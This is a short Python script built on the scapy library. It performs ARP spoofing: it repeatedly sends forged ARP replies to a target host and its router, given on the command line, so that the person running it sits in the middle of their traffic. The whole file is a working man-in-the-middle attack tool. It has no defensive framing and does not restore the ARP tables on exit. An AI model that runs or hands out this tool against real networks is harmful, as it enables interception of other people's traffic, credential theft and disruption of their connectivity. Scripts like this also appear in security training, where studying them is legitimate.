import scapy.all as scapy
import time
import optparse


def get_args():
    parser= optparse.OptionParser()
    parser.add_option("-t","--target",dest="target_ip", help="Specify the target ip")
    parser.add_option("-r","--router",dest="router_ip", help="Specify the router ip")
    parsing,_=parser.parse_args()
    return parsing


def get_mac(ip):
    request=scapy.ARP(pdst=ip)
    broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combine= broadcast/request
    mylist= scapy.srp(combine,timeout=2,verbose=False)[0]
    return mylist[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac=get_mac(target_ip)
    packet= scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet,verbose=False)


parsing=get_args()

packet_sent=0
try:
    while True:
        spoof(parsing.target_ip,parsing.router_ip)
        spoof(parsing.router_ip,parsing.target_ip)
        packet_sent+=2
        print("\r[+]Packets sent:"+ str(packet_sent),end="")
        time.sleep(5)
except KeyboardInterrupt:
    print("[+]Quitting")

